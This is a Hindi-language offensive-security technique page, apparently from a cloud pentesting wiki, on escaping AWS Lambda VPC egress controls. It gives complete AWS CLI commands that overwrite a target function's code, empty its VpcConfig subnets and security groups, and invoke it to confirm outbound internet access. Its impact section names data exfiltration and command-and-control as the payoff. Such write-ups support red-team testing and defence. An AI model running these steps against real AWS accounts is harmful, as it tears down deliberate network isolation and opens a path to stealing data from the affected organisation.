# AWS Lambda – VPC Egress Bypass by Detaching VpcConfig

एक Lambda फ़ंक्शन को प्रतिबंधित VPC से बाहर निकालें, इसकी configuration को खाली VpcConfig (SubnetIds=[], SecurityGroupIds=[]) से अपडेट करके। इसके बाद फ़ंक्शन Lambda-managed networking plane में चलेगा, बाहरी इंटरनेट पहुँच पुनः प्राप्त करेगा और उन egress controls को बाइपास करेगा जिन्हें private VPC subnets (NAT के बिना) द्वारा लागू किया गया था।

## इसका दुरुपयोग

- Pre-reqs: lambda:UpdateFunctionConfiguration on the target function (and lambda:InvokeFunction to validate), plus permissions to update code/handler if changing them.
- Assumptions: फ़ंक्शन वर्तमान में VpcConfig के साथ कॉन्फ़िगर है जो NAT के बिना private subnets की ओर इशारा करता है (इसलिए बाहरी इंटरनेट अवरुद्ध है)।
- Region: us-east-1

### चरण

0) एक न्यूनतम handler तैयार करें जो प्रमाणित करे कि बाहरी HTTP काम करता है

cat > net.py <<'PY'
import urllib.request, json

def lambda_handler(event, context):
try:
ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=3).read().decode().strip()
return {"egress": True, "ip": ip}
except Exception as e:
return {"egress": False, "err": str(e)}
PY
zip net.zip net.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://net.zip --region $REGION || true
aws lambda update-function-configuration --function-name $TARGET_FN --handler net.lambda_handler --region $REGION || true

1) वर्तमान VPC कॉन्फ़िग रिकॉर्ड करें (जरूरत पड़ने पर बाद में पुनर्स्थापित करने के लिए)

aws lambda get-function-configuration --function-name $TARGET_FN --query 'VpcConfig' --region $REGION > /tmp/orig-vpc.json
cat /tmp/orig-vpc.json

2) खाली सूचियाँ सेट करके VPC अलग करें

aws lambda update-function-configuration \
--function-name $TARGET_FN \
--vpc-config SubnetIds=[],SecurityGroupIds=[] \
--region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done

3) Invoke करें और बाहरी पहुंच सत्यापित करें

aws lambda invoke --function-name $TARGET_FN /tmp/net-out.json --region $REGION >/dev/null
cat /tmp/net-out.json

(Optional) मूल VPC कॉन्फ़िग पुनर्स्थापित करें

if jq -e '.SubnetIds | length > 0' /tmp/orig-vpc.json >/dev/null; then
SUBS=$(jq -r '.SubnetIds | join(",")' /tmp/orig-vpc.json); SGS=$(jq -r '.SecurityGroupIds | join(",")' /tmp/orig-vpc.json)
aws lambda update-function-configuration --function-name $TARGET_FN --vpc-config SubnetIds=[$SUBS],SecurityGroupIds=[$SGS] --region $REGION
fi

### प्रभाव
- फ़ंक्शन से अनियंत्रित बाहरी इंटरनेट पहुँच पुनः प्राप्त होती है, जिससे उन workloads से data exfiltration या C2 संभव हो जाता है जिन्हें जानबूझकर NAT के बिना private subnets में अलग-थलग किया गया था।

### उदाहरण आउटपुट (VpcConfig अलग करने के बाद)

{"egress": true, "ip": "34.x.x.x"}

### क्लीनअप
- यदि आपने कोई अस्थायी code/handler परिवर्तन किया है, तो उन्हें पुनर्स्थापित करें।
- वैकल्पिक रूप से ऊपर दिखाए अनुसार /tmp/orig-vpc.json में सहेजे गए मूल VpcConfig को पुनर्स्थापित करें।
